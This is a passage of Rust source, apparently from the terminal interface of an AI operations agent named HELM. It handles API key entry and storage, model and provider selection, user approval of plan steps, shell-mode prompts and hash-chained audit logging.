                KeyCode::Char(ch) => {
                    if let Some(ModalState::ModelSelector {
                        query, selected, ..
                    }) = &mut self.modal
                    {
                        query.push(ch);
                        *selected = 0;
                    }
                }
                _ => {}
            },
            Some(ModalState::ApiKeyInput { .. }) => match key.code {
                KeyCode::Esc => self.modal = None,
                KeyCode::Enter => {
                    if let Some(ModalState::ApiKeyInput { choice, input }) = self.modal.clone() {
                        let key = input.trim().to_owned();
                        if key.is_empty() {
                            self.push_chat(
                                MessageRole::System,
                                "API key cannot be empty. Press Esc to cancel.",
                            );
                        } else {
                            self.apply_provider_with_key(choice, key, true);
                        }
                    }
                }
                KeyCode::Backspace => {
                    if let Some(ModalState::ApiKeyInput { input, .. }) = &mut self.modal {
                        input.pop();
                    }
                }
                KeyCode::Char(ch) => {
                    if let Some(ModalState::ApiKeyInput { input, .. }) = &mut self.modal {
                        input.push(ch);
                    }
                }
                _ => {}
            },
            Some(ModalState::AuthRequired { .. }) => match key.code {
                KeyCode::Esc => {
                    self.pending_auth_retry = None;
                    self.modal = None;
                }
                KeyCode::Enter => {
                    if let Some(ModalState::AuthRequired {
                        provider_name,
                        env_name,
                        ..
                    }) = self.modal.clone()
                    {
                        let key_val = match &mut self.modal {
                            Some(ModalState::AuthRequired { input, .. }) => {
                                let value = input.trim().to_owned();
                                input.clear();
                                value
                            }
                            _ => String::new(),
                        };
                        if key_val.is_empty() {
                            if let Some(ModalState::AuthRequired { error, .. }) = &mut self.modal {
                                *error = Some("API key cannot be empty.".to_owned());
                            }
                        } else {
                            self.status_note = "validating key".to_owned();
                            match self.validate_key(&key_val).await {
                                Ok(()) => {
                                    let secret = helm_core::Secret::new(key_val.clone());
                                    if let Err(e) = self.runtime.secrets.set(&env_name, secret) {
                                        if let Some(ModalState::AuthRequired { error, .. }) =
                                            &mut self.modal
                                        {
                                            *error = Some(format!("Failed to save key: {e}"));
                                        }
                                    } else {
                                        self.active_settings.api_key = Some(key_val);
                                        self.push_chat(
                                            MessageRole::System,
                                            format!(
                                                "API key saved for {provider_name}. Retrying the task."
                                            ),
                                        );
                                        self.modal = None;
                                        if let Some(task) = self.pending_auth_retry.take() {
                                            self.start_task(task, tx, false).await?;
                                        }
                                    }
                                }
                                Err(error_text) => {
                                    if let Some(ModalState::AuthRequired { error, .. }) =
                                        &mut self.modal
                                    {
                                        *error = Some(error_text);
                                    }
                                }
                            }
                        }
                    }
                }
                KeyCode::Backspace => {
                    if let Some(ModalState::AuthRequired { input, .. }) = &mut self.modal {
                        input.pop();
                    }
                }
                KeyCode::Char(ch) => {
                    if let Some(ModalState::AuthRequired { input, .. }) = &mut self.modal {
                        input.push(ch);
                    }
                }
                _ => {}
            },
            Some(ModalState::ThemeSelector { .. }) => match key.code {
                KeyCode::Esc => self.modal = None,
                KeyCode::Up => {
                    if let Some(ModalState::ThemeSelector { selected }) = &mut self.modal {
                        *selected = selected.saturating_sub(1);
                    }
                }
                KeyCode::Down => {
                    if let Some(ModalState::ThemeSelector { selected }) = &mut self.modal {
                        let max = Theme::all().len().saturating_sub(1);
                        *selected = (*selected + 1).min(max);
                    }
                }
                KeyCode::Enter => {
                    if let Some(ModalState::ThemeSelector { selected }) = self.modal.clone() {
                        let themes = Theme::all();
                        if let Some(theme) = themes.get(selected).cloned() {
                            let label = theme.name().to_owned();
                            self.theme = theme;
                            self.push_chat(
                                MessageRole::System,
                                format!("[theme] switched to {label}"),
                            );
                        }
                    }
                    self.modal = None;
                }
                _ => {}
            },
            Some(ModalState::PlanExecution {
                ref plan_id,
                ref step_index,
                ref step_count,
                ref phase,
                ..
            }) if *phase == PlanExecPhase::Approving => match key.code {
                KeyCode::Char('y') | KeyCode::Char('Y') => {
                    let next = *step_index + 1;
                    let plan_id_clone = plan_id.clone();
                    if next >= *step_count {
                        // All approved — execute
                        if let Some(ModalState::PlanExecution { ref mut phase, .. }) = self.modal {
                            *phase = PlanExecPhase::Running;
                        }
                        self.push_chat(
                            MessageRole::System,
                            "[apply-plan] All steps approved. Executing...",
                        );
                        // Audit: approve this step
                        let _ = self.write_apply_plan_audit(&plan_id_clone, "approved");
                        self.start_apply_plan_execution(plan_id_clone);
                    } else {
                        let _ = self.write_apply_plan_audit(&plan_id_clone, "approved");
                        // Move to next step
                        if let Some(ModalState::PlanExecution {
                            ref mut step_index, ..
                        }) = self.modal
                        {
                            *step_index = next;
                        }
                    }
                }
                KeyCode::Char('n') | KeyCode::Char('N') => {
                    let next = *step_index + 1;
                    let plan_id = plan_id.clone();
                    if next >= *step_count {
                        self.push_chat(
                            MessageRole::System,
                            "[apply-plan] All remaining steps skipped.",
                        );
                        self.modal = None;
                    } else if let Some(ModalState::PlanExecution {
                        ref mut step_index, ..
                    }) = self.modal
                    {
                        *step_index = next;
                    }
                    let _ = self.write_apply_plan_audit(&plan_id, "denied");
                }
                KeyCode::Char('!') => {
                    // Approve all remaining
                    let plan_id = plan_id.clone();
                    if let Some(ModalState::PlanExecution { ref mut phase, .. }) = self.modal {
                        *phase = PlanExecPhase::Running;
                    }
                    self.push_chat(
                        MessageRole::System,
                        "[apply-plan] All steps approved. Executing...",
                    );
                    self.start_apply_plan_execution(plan_id);
                }
                KeyCode::Esc => {
                    self.modal = None;
                    self.push_chat(MessageRole::System, "[apply-plan] Cancelled by user.");
                }
                _ => {}
            },
            Some(ModalState::PlanExecution {
                phase: PlanExecPhase::Running,
                ..
            }) => {
                // Phase changes are driven by the spawned task completion
            }
            Some(ModalState::PlanExecution {
                phase: PlanExecPhase::Done,
                ..
            }) => {
                self.modal = None;
            }
            Some(ModalState::PlanExecution {
                phase: PlanExecPhase::Loading,
                ..
            }) => {}
            Some(_) => {
                if matches!(key.code, KeyCode::Esc | KeyCode::Enter) {
                    self.modal = None;
                }
            }
            None => {}
        }
        Ok(false)
    }

    fn key_matches(
        &self,
        key: &KeyEvent,
        action: &str,
        default_code: KeyCode,
        default_modifiers: KeyModifiers,
    ) -> bool {
        self.keymap.matches(action, key.code, key.modifiers)
            || (key.code == default_code && key.modifiers == default_modifiers)
    }

    async fn submit(&mut self, tx: mpsc::UnboundedSender<UiEvent>) -> Result<()> {
        if self.running {
            return Ok(());
        }
        let Some(task) = self.input.take_submit() else {
            return Ok(());
        };
        if let Some(command_text) = task.trim().strip_prefix('/') {
            let mut parts = command_text.trim().splitn(2, char::is_whitespace);
            let slug = parts.next().unwrap_or("");
            let args = parts.next().unwrap_or("").trim();
            if slug == "remote" {
                self.apply_remote_target(args);
            } else if let Some(command) = CommandAction::from_slug(slug) {
                self.execute_command_with_args(command, args);
            } else if let Some(command) = self
                .custom_commands
                .iter()
                .find(|command| command.name == slug)
                .cloned()
            {
                self.execute_custom_command(command, args, tx).await?;
            } else {
                self.push_chat(
                    MessageRole::Error,
                    format!("Unknown command `{task}`. Type /help or press Ctrl+P."),
                );
            }
            return Ok(());
        }
        if let Some(raw_query) = task.strip_prefix('#') {
            self.push_chat(MessageRole::User, task.clone());
            self.push_chat(MessageRole::System, self.quick_memory_report(raw_query));
            return Ok(());
        }
        if let Some(raw_shell) = task.strip_prefix('!') {
            let command = raw_shell.trim();
            if command.is_empty() {
                self.push_chat(
                    MessageRole::Error,
                    "Shell mode expects a command after `!`.",
                );
                return Ok(());
            }
            let wrapped = format!(
                "Run this shell command exactly once using the shell tool. \
Do not rewrite it unless required for safety or environment compatibility.\n\n\
Command:\n{command}\n\n\
Report the exit status and the concise output."
            );
            return self.start_prepared_task(task, wrapped, tx).await;
        }
        if self.mode == AgentMode::Dashboard {
            if !self.is_llm_provider_configured() {
                self.toast(
                    "No LLM provider configured. Run `helmops init --provider ollama` to enable AI-powered troubleshooting.",
                );
                return Ok(());
            }
            let agent_task = self.dashboard_issue_chat_task(&task);
            return self.start_task(agent_task, tx, true).await;
        }
        self.start_task(task, tx, true).await
    }

    async fn start_prepared_task(
        &mut self,
        display_task: String,
        agent_task: String,
        tx: mpsc::UnboundedSender<UiEvent>,
    ) -> Result<()> {
        if self.running {
            return Ok(());
        }
        self.push_chat(MessageRole::User, display_task);
        self.start_task_internal(agent_task, tx).await
    }

    async fn start_prepared_task_in_mode(
        &mut self,
        display_task: String,
        agent_task: String,
        tx: mpsc::UnboundedSender<UiEvent>,
        mode: AgentMode,
    ) -> Result<()> {
        if self.running {
            return Ok(());
        }
        self.push_chat(MessageRole::User, display_task);
        self.start_task_internal_with_mode(agent_task, tx, mode)
            .await
    }

    async fn start_task(
        &mut self,
        task: String,
        tx: mpsc::UnboundedSender<UiEvent>,
        echo_user: bool,
    ) -> Result<()> {
        if self.running {
            return Ok(());
        }
        if echo_user {
            self.push_chat(MessageRole::User, task.clone());
        }
        self.start_task_internal(task, tx).await
    }

    async fn start_task_internal(
        &mut self,
        task: String,
        tx: mpsc::UnboundedSender<UiEvent>,
    ) -> Result<()> {
        self.start_task_internal_with_mode(task, tx, self.mode)
            .await
    }

    async fn start_task_internal_with_mode(
        &mut self,
        task: String,
        _tx: mpsc::UnboundedSender<UiEvent>,
        _mode: AgentMode,
    ) -> Result<()> {
        self.record_tool_event("queued", "assistant", "request submitted");
        self.running = true;
        self.task_started = Some(Instant::now());
        self.status_note = "running".to_owned();
        self.active_run_id = self.active_run_id.saturating_add(1);
        self.session.transcript_scroll = 0;
        let contextual_task = if let Some(context) = self.resume_context.as_deref() {
            format!("{context}\n\nUser asks now: {task}")
        } else {
            task.clone()
        };
        let effective_task = wrap_for_remote(&contextual_task, self.active_remote.as_ref());
        let settings = self.active_settings.clone();

        let response = match build_provider(&settings, &self.runtime.secrets) {
            Ok((provider, model)) => {
                let request = ChatRequest {
                    model,
                    system: None,
                    messages: vec![Message::user(&effective_task)],
                    tools: vec![],
                    max_tokens: 2048,
                    temperature: 0.2,
                };
                provider
                    .chat(request)
                    .await
                    .map_err(|error| error.to_string())
            }
            Err(error) => Err(error.to_string()),
        };

        match response {
            Ok(reply) => {
                let text = reply
                    .content
                    .iter()
                    .filter_map(|block| match block {
                        helm_core::ContentBlock::Text(text) => Some(text.as_str()),
                        _ => None,
                    })
                    .collect::<Vec<_>>()
                    .join("\n")
                    .trim()
                    .to_owned();
                if text.is_empty() {
                    self.push_chat(
                        MessageRole::System,
                        "The assistant returned no text. Use the dashboard hotkeys or try a narrower troubleshoot prompt.",
                    );
                } else {
                    self.push_chat(MessageRole::Assistant, text);
                }
                self.record_tool_event("done", "assistant", "response ready");
                self.status_note = "ready".to_owned();
            }
            Err(error) => {
                self.push_chat(MessageRole::Error, friendly_error(&error));
                self.record_tool_event("error", "assistant", "request failed");
                self.status_note = "error".to_owned();
            }
        }

        self.running = false;
        self.task_started = None;
        Ok(())
    }

    async fn validate_key(&self, key: &str) -> Result<(), String> {
        let mut settings = self.active_settings.clone();
        settings.api_key = Some(key.to_owned());
        let (provider, model) =
            build_provider(&settings, &self.runtime.secrets).map_err(|error| error.to_string())?;
        let request = ChatRequest {
            model,
            system: None,
            messages: vec![Message::user("Reply ok.")],
            tools: vec![],
            max_tokens: 1,
            temperature: 0.0,
        };
        provider.chat(request).await.map(|_| ()).map_err(|error| {
            let text = error.to_string();
            if is_auth_error(&text) {
                "Validation failed: invalid API key.".to_owned()
            } else {
                format!("Validation failed: {}", truncate(text, 180))
            }
        })
    }

    fn cancel_running_task(&mut self) {
        if let Some(task) = self.agent_task.take() {
            task.abort();
        }
        self.running = false;
        self.active_run_id = self.active_run_id.saturating_add(1);
        self.status_note = "cancelled".to_owned();
        self.pending_tool_summaries.clear();
        self.active_tool_cells.clear();
        self.push_chat(
            MessageRole::System,
            "Cancelled current task. HELM is ready for the next prompt.",
        );
        self.record_tool_event("cancel", "assistant", "request aborted");
    }

    fn replay_hint(&self) -> String {
        match self.session.episode_id.as_deref() {
            Some(id) => format!("Replay this episode with `helm replay {id}`."),
            None => "No episode is loaded yet.".to_owned(),
        }
    }

    fn doctor_hint(&self) -> String {
        format!(
            "Provider: {} | Model: {} | Database: {}\nRun `helm doctor --provider {} --model {}` for live provider diagnostics.",
            self.provider_name,
            self.model,
            self.runtime.db_path.display(),
            self.provider_name,
            self.model
        )
    }

    fn browser_hint(&self) -> String {
        "Browser automation is PinchTab-backed. Browser content is external-tainted; privileged actions require fresh approval.".to_owned()
    }

    fn quick_memory_report(&self, raw_query: &str) -> String {
        let query = raw_query.trim();
        if query.is_empty() {
            return "[memory] usage: `# <query>` — searches recent episodes and graph entities."
                .to_owned();
        }
        let query = query.to_owned();
        let memory = Arc::clone(&self.runtime.memory);
        tokio::task::block_in_place(|| {
            tokio::runtime::Handle::current().block_on(async move {
                let query_lower = query.to_ascii_lowercase();
                let recent = memory.recent_episodes(20).await.unwrap_or_default();
                let episode_lines = recent
                    .into_iter()
                    .filter(|episode| episode.goal.to_ascii_lowercase().contains(&query_lower))
                    .take(5)
                    .map(|episode| {
                        format!(
                            "  - [{}] {}",
                            episode.id,
                            episode.goal.chars().take(80).collect::<String>()
                        )
                    })
                    .collect::<Vec<_>>();

                let graph_lines = dirs::data_local_dir()
                    .map(|root| root.join("helm").join("graph.db"))
                    .and_then(|path| helm_memory::EntityGraph::open(&path).ok())
                    .and_then(|graph| graph.find_entities(None, Some(&query)).ok())
                    .unwrap_or_default()
                    .into_iter()
                    .take(5)
                    .map(|entity| format!("  - {} [{}]", entity.name, entity.kind))
                    .collect::<Vec<_>>();

                let episodes = if episode_lines.is_empty() {
                    "  - no recent episode matches".to_owned()
                } else {
                    episode_lines.join("\n")
                };
                let graph = if graph_lines.is_empty() {
                    "  - no graph entities match".to_owned()
                } else {
                    graph_lines.join("\n")
                };

                format!(
                    "[memory] query: {query}\nrecent episodes:\n{episodes}\ngraph entities:\n{graph}"
                )
            })
        })
    }

    fn remote_hint(&self) -> String {
        match self.active_remote.as_deref() {
            Some(target) => format!(
                "Active remote target: {target}. Use `/remote NAME` to switch or `/remote off` to return to local mode."
            ),
            None => "No remote target selected. Use `/remote NAME` to target a registered host or `/remote off` for local mode.".to_owned(),
        }
    }

    fn push_chat(&mut self, role: MessageRole, text: impl Into<String>) {
        let text: String = text.into();
        self.session.chat.push(ChatMessage { role, text });
        self.session.transcript_scroll = 0;
    }

    /// Write a hash-chained audit event for a TUI apply-plan approval.
    fn write_apply_plan_audit(&self, plan_id: &str, decision: &str) -> Result<()> {
        let db_path = &self.runtime.db_path;
        let conn = rusqlite::Connection::open(db_path)?;
        let prev = helm_memory::latest_audit_hash(&conn, Some("tui"))
            .unwrap_or_else(|_| "GENESIS".to_string());
        let ts = chrono::Utc::now().timestamp_millis();
        let hash = helm_memory::audit_hash(helm_memory::AuditHashParts {
            previous_hash: &prev,
            episode_id: Some("tui-apply"),
            target: Some("tui"),
            timestamp: ts,
            tool_name: "apply-plan",
            input_hash: &helm_memory::stable_hash_hex(plan_id),
            output_hash: &helm_memory::stable_hash_hex(decision),
            capability: "shell.shell",
            taint: "clean",
            cwd: "",
            decision,
        });
        conn.execute(
            "INSERT INTO audit_events (episode_id, target, timestamp, tool_name, input_hash, output_hash, capability, taint, cwd, decision, previous_hash, event_hash) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, ?12)",
            rusqlite::params!["tui-apply", "tui", ts, "apply-plan", &helm_memory::stable_hash_hex(plan_id), &helm_memory::stable_hash_hex(decision), "shell.shell", "clean", "", decision, &prev, &hash],
        )?;
        Ok(())
    }

    /// Returns true when there is a usable LLM provider — either Ollama (local)
    /// or a cloud provider with an API key available.
    fn is_llm_provider_configured(&self) -> bool {
        if self.active_settings.choice == ProviderChoice::Ollama {
            // Ollama is local; always considered configured.
            true
        } else {
            // Cloud providers (Groq, Anthropic, Gemini, OpenRouter, NvidiaNim,
            // OpenaiCompat, Auto) need an API key.
            self.active_settings.api_key.is_some()
        }
    }

    /// Write a hash-chained audit event when the blocklist catches a dangerous
    /// command produced by the LLM. The command text is SHA-256 hashed and
    /// truncated to 80 chars, never stored in plaintext.
    fn write_dashboard_audit(&self, command_text: &str, pattern: &str) -> Result<()> {
        let db_path = &self.runtime.db_path;
        let conn = rusqlite::Connection::open(db_path)?;
        let prev = helm_memory::latest_audit_hash(&conn, Some("tui"))
            .unwrap_or_else(|_| "GENESIS".to_string());
        let ts = next_audit_timestamp(&conn)?;
        // Redact secrets and truncate.
        let command_display = {
            let redacted = helm_core::redact_secrets(command_text);
            truncate_cell(&redacted, 80)
        };
        let hash = helm_memory::audit_hash(helm_memory::AuditHashParts {
            previous_hash: &prev,
            episode_id: None,
            target: Some("tui"),
            timestamp: ts,
            tool_name: "plan-blocked",
            input_hash: &helm_memory::stable_hash_hex(command_text),
            output_hash: &helm_memory::stable_hash_hex(pattern),
            capability: "shell.shell",
            taint: "clean",
            cwd: "",
            decision: &format!("BLOCKED:{pattern}"),
        });
        conn.execute(
            "INSERT INTO audit_events (episode_id, target, timestamp, tool_name, input_hash, output_hash, capability, taint, cwd, decision, previous_hash, event_hash) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, ?12)",
            rusqlite::params![
                rusqlite::types::Null,
                "tui",
                ts,
                "plan-blocked",
                &helm_memory::stable_hash_hex(command_text),
                &helm_memory::stable_hash_hex(pattern),
                "shell.shell",
                "clean",
                "",
                &format!("BLOCKED:{pattern}"),
                &prev,
                &hash,
            ],
        )?;
        tracing::info!("plan-blocked audit: hash={hash} display=\"{command_display}\"");
        Ok(())
    }

    /// Write a hash-chained audit event for TUI dashboard actions
    /// (collector runs, finding state transitions, approved commands,
    /// rejected plans). Uses taint="clean", cwd="", target="tui",
    /// episode_id=None.
    fn write_dashboard_event(
        &self,
        tool_name: &str,
        capability: &str,
        decision: &str,
        input_hash: &str,
        output_hash: &str,
    ) -> Result<()> {
        let db_path = &self.runtime.db_path;
        let conn = rusqlite::Connection::open(db_path)?;
        let prev = helm_memory::latest_audit_hash(&conn, Some("tui"))
            .unwrap_or_else(|_| "GENESIS".to_string());
        let ts = next_audit_timestamp(&conn)?;
        let hash = helm_memory::audit_hash(helm_memory::AuditHashParts {
            previous_hash: &prev,
            episode_id: None,
            target: Some("tui"),
            timestamp: ts,
            tool_name,
            input_hash,
            output_hash,
            capability,
            taint: "clean",
            cwd: "",
            decision,
        });
        conn.execute(
            "INSERT INTO audit_events (episode_id, target, timestamp, tool_name, input_hash, output_hash, capability, taint, cwd, decision, previous_hash, event_hash) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, ?12)",
            rusqlite::params![
                rusqlite::types::Null,
                "tui",
                ts,
                tool_name,
                input_hash,
                output_hash,
                capability,
                "clean",
                "",
                decision,
                &prev,
                &hash,
            ],
        )?;
        tracing::info!(
            tool_name = tool_name,
            event_hash = hash,
            "dashboard audit event written"
        );
        Ok(())
    }

    /// Tag a finding as `plan_rejected` in its in-memory state_note.
    fn tag_finding_rejected(&mut self, idx: usize) {
        if let Some(finding) = self.dashboard.data.findings.get_mut(idx) {
            if finding.state_note.contains("plan_rejected") {
                return; // already tagged
            }
            if finding.state_note.is_empty() {
                finding.state_note = "plan_rejected".to_string();
            } else {
                finding.state_note.push_str(" plan_rejected");
            }
        }
    }

    fn toast(&mut self, text: impl Into<String>) {
        self.toast_variant(text, ToastVariant::Info);
    }

    fn toast_variant(&mut self, text: impl Into<String>, variant: ToastVariant) {
        self.toast = Some(ToastState {
            text: sanitize_one_line(&text.into()),
            created: Instant::now(),
            variant,
        });
    }

    fn record_tool_event(
        &mut self,
        status: impl Into<String>,
        tool: impl Into<String>,
        detail: impl Into<String>,
    ) {
        let item = ToolTimelineItem {
            status: sanitize_one_line(&status.into()),
            tool: sanitize_one_line(&tool.into()),
            detail: sanitize_one_line(&detail.into()),
        };
        self.session.tool_timeline.push(item.clone());
        self.status_note = activity_status_note(&item);
        if let Some(text) = visible_activity_text(&item) {
            self.session.chat.push(ChatMessage {
                role: MessageRole::Activity,
                text,
            });
            self.session.transcript_scroll = 0;
        }
    }

    #[cfg(test)]
    fn chat_ends_with(&self, role: MessageRole, text: &str) -> bool {
        self.session
            .chat
            .last()
            .is_some_and(|message| message.role == role && message.text.trim() == text.trim())
    }

    fn new_session(&mut self) {
        self.session = SessionState::default();
        self.session_tokens_in = 0;
        self.session_tokens_out = 0;
        self.resume_context = None;
        self.input.clear();
        self.push_chat(MessageRole::System, "New session started.");
        self.modal = None;
    }

    fn clear_transcript(&mut self) {
        self.session.chat.clear();
        self.session.transcript_scroll = 0;
        self.push_chat(MessageRole::System, "Transcript cleared.");
    }

    fn env_candidates_for(&self, choice: ProviderChoice) -> Vec<String> {
        match choice {
            ProviderChoice::Gemini => {
                let mut names = Vec::new();
                let primary = if choice == self.active_settings.choice {
                    self.active_settings
                        .api_key_env
                        .clone()
                        .unwrap_or_else(|| "GOOGLE_API_KEY".to_owned())
                } else {
                    "GOOGLE_API_KEY".to_owned()
                };
                names.push(primary);
                if !names.iter().any(|name| name == "GEMINI_API_KEY") {
                    names.push("GEMINI_API_KEY".to_owned());
                }
                names
            }
            _ => default_api_key_env(choice)
                .map(|name| vec![name.to_owned()])
                .unwrap_or_default(),
        }
    }

    fn provider_key_status(&self, choice: ProviderChoice) -> ProviderKeyStatus {
        if choice == ProviderChoice::Ollama {
            return ProviderKeyStatus::NoKeyNeeded;
        }
        let env_names = self.env_candidates_for(choice);
        let has_env = env_names.iter().any(|name| std::env::var(name).is_ok());
        let has_stored = env_names
            .iter()
            .any(|name| self.runtime.secrets.get(name).ok().flatten().is_some());
        let has_session = choice == self.active_settings.choice
            && self
                .active_settings
                .api_key
                .as_ref()
                .is_some_and(|key| !key.trim().is_empty());

        if has_stored {
            return ProviderKeyStatus::Stored;
        }
        if has_env {
            return ProviderKeyStatus::Env;
        }
        if has_session {
            return ProviderKeyStatus::Session;
        }
        ProviderKeyStatus::Unset
    }

    fn resolved_provider_key(&self, choice: ProviderChoice) -> Option<String> {
        if choice == self.active_settings.choice
            && let Some(key) = self.active_settings.api_key.as_ref()
            && !key.trim().is_empty()
        {
            return Some(key.clone());
        }
        for env_name in self.env_candidates_for(choice) {
            if let Ok(Some(secret)) = self.runtime.secrets.get(&env_name) {
                return Some(secret.expose().to_owned());
            }
        }
        for env_name in self.env_candidates_for(choice) {
            if let Ok(value) = std::env::var(&env_name)
                && !value.trim().is_empty()
            {
                return Some(value);
            }
        }
        None
    }

    fn model_catalog_entries(&mut self) -> Vec<ModelCatalogEntry> {
        let now = Instant::now();
        let mut all = Vec::new();
        for (choice, _) in provider_selector_list() {
            let entries = if let Some(cached) = self.catalog_cache.get(&choice) {
                if now.duration_since(cached.fetched_at) <= Duration::from_secs(5 * 60) {
                    cached.entries.clone()
                } else {
                    self.refresh_catalog_for(choice)
                }
            } else {
                self.refresh_catalog_for(choice)
            };
            all.extend(entries);
        }
        all.sort_by(|left, right| {
            left.group
                .cmp(&right.group)
                .then_with(|| left.label.cmp(&right.label))
        });
        all
    }

    fn refresh_catalog_for(&mut self, choice: ProviderChoice) -> Vec<ModelCatalogEntry> {
        let entries = tokio::task::block_in_place(|| {
            Handle::current().block_on(fetch_model_catalog_for_provider(
                choice,
                &self.active_settings,
                self.resolved_provider_key(choice),
            ))
        })
        .unwrap_or_else(|_| static_model_catalog_for(choice));
        self.catalog_cache.insert(
            choice,
            CachedModelCatalog {
                fetched_at: Instant::now(),
                entries: entries.clone(),
            },
        );
        entries
    }

    fn apply_provider_choice(&mut self, choice: ProviderChoice) {
        let resolved_key = self.resolved_provider_key(choice);

        if choice == ProviderChoice::Ollama || resolved_key.is_some() {
            self.apply_provider_with_key(choice, resolved_key.unwrap_or_default(), false);
        } else {
            // No key available — prompt the user
            let mut s = self.active_settings.with_choice(choice);
            s.api_key_env = default_api_key_env(choice).map(str::to_owned);
            s.api_key = None;
            s.model = None;
            self.active_settings = s;
            self.modal = Some(ModalState::ApiKeyInput {
                choice,
                input: String::new(),
            });
        }
    }

    fn apply_provider_with_key(&mut self, choice: ProviderChoice, key: String, persist_key: bool) {
        if persist_key {
            if let Some(env_name) = default_api_key_env(choice) {
                if let Err(error) = self
                    .runtime
                    .secrets
                    .set(env_name, helm_core::Secret::new(key.clone()))
                {
                    self.push_chat(
                        MessageRole::Error,
                        format!("failed to save key to secrets store: {error}"),
                    );
                }
            }
        }
        let mut s = self.active_settings.with_choice(choice);
        s.api_key_env = default_api_key_env(choice).map(str::to_owned);
        s.api_key = if key.is_empty() {
            None
        } else {
            Some(key.clone())
        };
        s.model = None;
        self.active_settings = s;
        self.provider_name = provider_choice_name(choice).to_owned();
        self.model = "auto".to_owned();
        self.modal = None;
        self.push_chat(
            MessageRole::System,
            format!(
                "Switched to {}. Type a task to begin.",
                provider_choice_name(choice)
            ),
        );
        self.save_provider_to_config(choice);
    }

    fn apply_model_entry(&mut self, entry: ModelCatalogEntry) {
        let mut settings = self.active_settings.with_choice(entry.provider);
        settings.api_key_env = default_api_key_env(entry.provider).map(str::to_owned);
        settings.model = Some(entry.model.clone());
        if settings.choice != self.active_settings.choice {
            settings.api_key = None;
        }
        self.active_settings = settings;
        self.provider_name = provider_choice_name(entry.provider).to_owned();
        self.model = entry.model.clone();
        self.modal = None;
        self.push_chat(
            MessageRole::System,
            format!(
                "Model set to {} ({}) via {}. Type a task to begin.",
                entry.label, entry.model, self.provider_name
            ),
        );
        self.save_provider_to_config(entry.provider);
    }

    fn apply_manual_model(&mut self, model: String) {
        self.active_settings.model = Some(model.clone());
        self.model = model.clone();
        self.modal = None;
        self.push_chat(
            MessageRole::System,
            format!("Model set to {model}. Type a task to begin."),
        );
        self.save_provider_to_config(self.active_settings.choice);
    }

    fn save_provider_to_config(&self, choice: ProviderChoice) {
        let model = self
            .active_settings
            .model
            .as_deref()
            .unwrap_or_else(|| default_model_name(choice));
        let _ = write_helm_config(
            &self.runtime.config_path,
            &self.runtime.db_path,
            provider_choice_name(choice),
            model,
            self.active_settings.base_url.as_deref(),
            default_api_key_env(choice),
        );
    }

    fn slash_filtered(&self) -> Vec<SlashItem> {
        let raw = self.input.text.trim_start_matches('/').to_ascii_lowercase();
        let query = raw.split_whitespace().next().unwrap_or("");
        let mut items = CommandAction::all()
            .into_iter()
            .filter(|action| action.slug().starts_with(query) || action.matches_slug(query))
            .map(SlashItem::BuiltIn)
            .collect::<Vec<_>>();
        items.extend(self.custom_commands.iter().cloned().map(SlashItem::Custom));
        items
            .into_iter()
            .filter(|item| item.slug().starts_with(query))
            .collect()
    }

    fn filtered_palette_items(&self) -> Vec<PaletteItem> {
        let query = self.command_palette.query.as_str();
        let mut items = CommandAction::all()
            .into_iter()
            .map(PaletteItem::BuiltIn)
            .collect::<Vec<_>>();
        items.extend(
            self.custom_commands
                .iter()
                .cloned()
                .map(PaletteItem::Custom),
        );
        items
            .into_iter()
            .filter(|item| item.matches_query(query))
            .collect()
    }

    async fn execute_palette_item(
        &mut self,
        item: PaletteItem,
        tx: mpsc::UnboundedSender<UiEvent>,
    ) -> Result<()> {
        match item {
            PaletteItem::BuiltIn(command) => self.execute_command(command),
            PaletteItem::Custom(command) => {
                let expanded = custom_commands::expand(&command, "");
                self.modal = None;
                self.start_task(expanded, tx, true).await?;
            }
        }
        Ok(())
    }

    async fn execute_custom_command(
        &mut self,
        command: custom_commands::CustomCommand,
        args: &str,
        tx: mpsc::UnboundedSender<UiEvent>,
    ) -> Result<()> {
        let expanded = custom_commands::expand(&command, args);
        self.start_task(expanded, tx, true).await
    }

    fn update_slash_popup(&mut self) {
        if self.input.text.starts_with('/') {
            let filtered = self.slash_filtered();
            if filtered.is_empty() {
                self.slash_popup = None;
            } else {
                let max = filtered.len().saturating_sub(1);
                self.slash_popup = Some(self.slash_popup.unwrap_or(0).min(max));
            }
        } else {
            self.slash_popup = None;
        }
    }

    async fn execute_slash_from_popup(&mut self, tx: mpsc::UnboundedSender<UiEvent>) -> Result<()> {
        let filtered = self.slash_filtered();
        if let Some(sel) = self.slash_popup {
            if let Some(cmd) = filtered.get(sel).cloned() {
                self.input.clear();
                self.slash_popup = None;
                match cmd {
                    SlashItem::BuiltIn(command) => self.execute_command(command),
                    SlashItem::Custom(command) => {
                        self.execute_custom_command(command, "", tx).await?
                    }
                }
            }
        }
        Ok(())
    }

    fn open_palette(&mut self) {
        self.command_palette = CommandPaletteState::new();
        self.modal = Some(ModalState::CommandPalette);
    }

    fn execute_command(&mut self, command: CommandAction) {
        self.modal = None;
        match command {
            CommandAction::NewSession => self.new_session(),
            CommandAction::Clear => self.clear_transcript(),
            CommandAction::Replay => self.push_chat(MessageRole::System, self.replay_hint()),
            CommandAction::Doctor => self.push_chat(MessageRole::System, self.doctor_hint()),
            CommandAction::Remote => self.push_chat(MessageRole::System, self.remote_hint()),
            CommandAction::Provider => {
                let current = provider_selector_list()
                    .iter()
                    .position(|(c, _)| *c == self.active_settings.choice)
                    .unwrap_or(0);
                self.modal = Some(ModalState::ProviderSelector { selected: current });
            }
            CommandAction::Model => {
                let entries = self.model_catalog_entries();
                self.modal = Some(ModalState::ModelSelector {
                    query: String::new(),
                    selected: entries
                        .iter()
                        .position(|entry| {
                            entry.provider == self.active_settings.choice
                                && entry.model == self.model.as_str()
                        })
                        .unwrap_or(0),
                    entries,
                });
            }
            CommandAction::Permissions => {
                self.modal = Some(ModalState::Permission {
                    capability: Capability::ShellShell,
                    tool_name: "permissions".to_owned(),
                    taint: "user".to_owned(),
                    detail: "Use `helm permissions list/grant/revoke` for exact grant control."
                        .to_owned(),
                })
            }
            CommandAction::Audit => {
                self.record_tool_event("audit", "verify", "run `helm audit verify`")
            }
            CommandAction::Skills => {
                self.record_tool_event("skills", "library", "run `helm skills list`")
            }
            CommandAction::Browser => self.push_chat(MessageRole::System, self.browser_hint()),
            CommandAction::Init => match crate::generate_agents_md_for_dir(
